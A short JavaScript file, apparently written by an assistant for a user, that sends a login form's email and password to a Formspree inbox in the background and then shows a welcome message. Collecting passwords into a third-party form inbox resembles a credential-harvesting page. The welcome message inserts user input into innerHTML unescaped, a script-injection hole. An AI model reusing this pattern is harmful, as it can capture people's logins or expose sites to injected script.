/*
 * This is the new code to submit the form in the background.
 * It replaces your old 'toggleSubmit' function.
*/
document.addEventListener("DOMContentLoaded", function() {
    // Find the form by its new ID
    const form = document.getElementById('login-form');
    
    // Add a 'submit' event listener to the form
    form.addEventListener('submit', function(event) {
        
        // This is the most important line:
        // It stops the form from redirecting.
        event.preventDefault(); 
        
        // Get the email value for your welcome message
        const email = document.getElementById("email").value;
        
        // Get all the form data (email and psw)
        const formData = new FormData(form);
        const formspreeURL = 'https://formspree.io/f/manlpvpk'; // Your link

        // Send the data to Formspree in the background (AJAX)
        fetch(formspreeURL, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(response => {
            if (response.ok) {
                // If Formspree gets the data, show your original "Welcome" message
                document.body.innerHTML = `<h1>Welcome, ${email}.</h1>`;
            } else {
                // If there's an error, log it and alert the user
                response.json().then(data => {
                    if (Object.hasOwn(data, 'errors')) {
                        alert(data["errors"].map(error => error["message"]).join(", "));
                    } else {
                        alert("Oops! There was a problem submitting your form.");
                    }
                })
            }
        })
        .catch(error => {
            // Handle network errors
            alert("A network error occurred. Please check your connection.");
        });
    });
});


/*
 * Your original 'toggleDark' function is below.
 * It is unchanged and will work perfectly.
*/
function toggleDark() {
  let btnDark = document.getElementById('btnDark');
  let body = document.getElementById('body');
  let form = document.getElementById('form');
  let box = document.getElementById('box');
  let link = document.getElementById('link');

  body.classList.toggle('dark');
  form.classList.toggle('formDark');
  box.classList.toggle('boxDark');
  link.classList.toggle('linkDark');

  const saveLocal =  localStorage.setItem('dark', 'on')
  const saveDark = localStorage.getItem('dark')
  // if(saveLocal==)
}
